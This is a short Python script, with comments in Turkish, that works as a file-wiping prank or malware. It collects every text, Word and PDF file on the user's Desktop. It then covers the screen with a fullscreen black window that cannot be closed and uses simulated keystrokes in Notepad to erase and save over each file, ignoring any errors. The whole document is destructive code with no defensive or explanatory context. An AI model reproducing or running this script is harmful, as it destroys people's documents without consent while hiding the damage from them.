import os
import time
import subprocess
import pyautogui
import tkinter as tk
import threading

desktop = os.path.join(os.environ["USERPROFILE"], "Desktop")
targets = []
for root, dirs, files in os.walk(desktop):
    for file in files:
        if file.endswith((".txt", ".docx", ".pdf")):
            targets.append(os.path.join(root, file))

def black_screen():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.mainloop()

def wipe_file(file_path):
    subprocess.Popen(["notepad.exe", file_path])
    time.sleep(1.5)
    pyautogui.hotkey("ctrl", "a")
    pyautogui.press("backspace")
    pyautogui.hotkey("ctrl", "s")
    pyautogui.hotkey("alt", "f4")

# ekranı kilitle
threading.Thread(target=black_screen, daemon=True).start()

# her dosyayı temizle
for file in targets:
    try:
        wipe_file(file)
    except:
        continue

